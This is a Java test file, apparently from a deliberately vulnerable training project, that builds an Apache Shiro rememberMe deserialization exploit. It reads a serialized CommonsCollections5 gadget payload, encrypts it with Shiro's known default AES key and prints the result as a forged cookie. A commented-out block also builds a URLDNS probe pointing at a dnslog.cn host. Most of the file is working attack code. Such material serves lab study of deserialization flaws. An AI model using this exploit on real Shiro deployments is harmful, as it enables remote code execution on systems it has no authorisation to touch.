package icu.secnotes.test;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class ShiroExpTest {


    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("/Users/liujianping/SpringVulnBoot/SpringVulnBoot-backend/src/test/java/icu/secnotes/test/URLDNS.ser"));
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        System.out.println("序列化成功");
    }

    public static Object deserialize(String filename) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {
            Object obj = ois.readObject();
            System.out.println(obj);
            System.out.println("反序列化成功");
            return obj;
        }
    }

    public static void generateRememberMe() throws Exception {

        //byte[] payload = Files.readAllBytes(FileSystems.getDefault().getPath("/Users/liujianping/SpringVulnBoot/SpringVulnBoot-backend/src/test/java/icu/secnotes/test/URLDNS.ser"));
        byte[] payload = Files.readAllBytes(FileSystems.getDefault().getPath("/Users/liujianping/SpringVulnBoot/SpringVulnBoot-backend/src/test/java/icu/secnotes/test/cc5_payload_52.ser"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource cipherText = aes.encrypt(payload, key);
        System.out.println(cipherText);

    }

    public static void main(String[] args) throws Exception {

        // urldns的生成脚本
        /* HashMap<URL, Integer> hashMap = new HashMap<>();
        URL url = new URL("http://112358.4g2bg9.dnslog.cn");

        //为了不让这里发起请求，把url对象的hashCode改成不是-1
        Class<? extends URL> urlClass = url.getClass();
        Field hashCodeField = urlClass.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 1234);
        Integer rs = hashMap.put(url, 1);
        System.out.println(rs);
        hashCodeField.set(url, -1);
        serialize(hashMap); */

        //反序列化
        // Object o = deserialize("/Users/liujianping/IdeaProjects/ShiroTestProj/ShiroDemo/src/test/java/com/example/shirodemo/URLDNS.ser");
        // System.out.println(o);

        // 根据payload生成rememberMe的payload
        generateRememberMe();
       
    }

}
